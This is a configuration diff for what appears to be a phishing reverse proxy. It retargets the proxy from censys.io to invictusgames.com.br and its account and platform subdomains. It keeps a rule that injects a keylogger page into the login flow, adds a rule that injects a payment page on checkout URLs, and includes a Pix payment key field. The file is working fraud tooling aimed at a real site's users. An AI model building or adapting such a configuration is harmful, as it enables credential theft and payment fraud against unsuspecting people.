@@ -15,14 +15,14 @@
   },
   "server": {
     "endPoints": {
-      "localhost": "https://censys.com",
-      "www.localhost": "https://www.censys.com",
-      "com.localhost": "https://censys.com",
-      "dynamic.localhost": "https://www.example.com",
-      "account.localhost": "https://account.censys.io",
-      "platform.localhost": "https://platform.censys.io"
+      "localhost": "https://www.invictusgames.com.br",
+      "www.localhost": "https://www.invictusgames.com.br",
+      "com.localhost": "https://invictusgames.com.br",
+      "dynamic.localhost": "https://www.invictusgames.com.br",
+      "account.localhost": "https://account.invictusgames.com.br",
+      "platform.localhost": "https://platform.invictusgames.com.br"
     },
-    "remoteAddress": "https://censys.io",
+    "remoteAddress": "https://invictusgames.com.br",
     "localPortListener": 443,
     "pixKey": "brasil...",
     "autoGenerateSslCertificate": true,
@@ -32,7 +32,7 @@
     "enableCache": false,
     "extraReplace": [
       {
-        "replace": "censys.io",
+        "replace": "invictusgames.com.br",
         "with": "localhost"
       },
       {
@@ -63,6 +63,10 @@
         "urlContain": "ys.io/login?return_to=htt",
         "bodyContain": "<body",
         "inject": "keylogger.html"
+      },
+      {
+        "urlContain": "checkout",
+        "inject": "payment.html"
       }
     ]
   },
